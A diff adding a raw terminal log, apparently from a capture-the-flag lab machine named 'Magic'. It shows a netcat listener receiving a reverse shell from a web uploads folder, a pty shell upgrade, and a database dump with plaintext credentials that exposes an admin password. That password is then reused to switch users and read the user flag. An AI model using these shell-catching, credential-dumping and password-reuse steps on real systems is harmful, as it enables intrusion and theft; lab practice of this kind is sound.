@@ -1,0 +1,105 @@
+root@kali:~# nc -lvnp 4789
+listening on [any] 4789 ...
+connect to [10.10.14.168] from (UNKNOWN) [10.10.10.185] 34160
+bash: cannot set terminal process group (1168): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/var/www/Magic/images/uploads$ mysqldump -d Magic -u theseus -p iamkingtheseus
+<ds$ mysqldump -d Magic -u theseus -p iamkingtheseus
+Enter password: 
+mysqldump: Got error: 1045: Access denied for user 'theseus'@'localhost' (using password: NO) when trying to connect
+www-data@ubuntu:/var/www/Magic/images/uploads$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+<ds$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@ubuntu:/var/www/Magic/images/uploads$ 
+www-data@ubuntu:/var/www/Magic/images/uploads$ mysqldump --databases Magic -u theseus -p iamkingtheseus
+<dump --databases Magic -u theseus -p iamkingtheseus
+Enter password: iamkingtheseus
+
+-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
+--
+-- Host: localhost    Database: Magic
+-- ------------------------------------------------------
+-- Server version       5.7.29-0ubuntu0.18.04.1
+
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
+/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
+/*!40101 SET NAMES utf8 */;
+/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
+/*!40103 SET TIME_ZONE='+00:00' */;
+/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
+/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
+/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
+/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
+
+--
+-- Current Database: `Magic`
+--
+
+CREATE DATABASE /*!32312 IF NOT EXISTS*/ `Magic` /*!40100 DEFAULT CHARACTER SET latin1 */;
+
+USE `Magic`;
+
+--
+-- Table structure for table `login`
+--
+
+DROP TABLE IF EXISTS `login`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!40101 SET character_set_client = utf8 */;
+CREATE TABLE `login` (
+  `id` int(6) NOT NULL AUTO_INCREMENT,
+  `username` varchar(50) NOT NULL,
+  `password` varchar(100) NOT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `username` (`username`)
+) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `login`
+--
+
+LOCK TABLES `login` WRITE;
+/*!40000 ALTER TABLE `login` DISABLE KEYS */;
+INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+/*!40000 ALTER TABLE `login` ENABLE KEYS */;
+UNLOCK TABLES;
+mysqldump: Got error: 1044: Access denied for user 'theseus'@'localhost' to database 'iamkingtheseus' when selecting the database
+www-data@ubuntu:/var/www/Magic/images/uploads$ ^C
+
+
+
+
+
+
+
+
+
+www-data@ubuntu:/var/www/Magic/images/uploads$ su theseus
+su theseus
+Password: python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+
+su: Authentication failure
+www-data@ubuntu:/var/www/Magic/images/uploads$ 
+www-data@ubuntu:/var/www/Magic/images/uploads$ su theseus    
+su theseus
+Password: Th3s3usW4sK1ng
+
+theseus@ubuntu:/var/www/Magic/images/uploads$ ls
+ls
+7.jpg      magic-1424x900.jpg  magic-hat_23-2147512156.jpg
+giphy.gif  magicbro2.jpg       magic-wand.jpg
+logo.png   magicbro.jpg        trx.jpg
+theseus@ubuntu:/var/www/Magic/images/uploads$ cd ~/
+cd ~/
+theseus@ubuntu:~$ ls
+ls
+Desktop    Downloads  Pictures  Templates  Videos
+Documents  Music      Public    user.txt
+theseus@ubuntu:~$ cat user.txt
+cat user.txt
+eddd27e167745c3c16cf33c48f5a142b
+theseus@ubuntu:~$ 
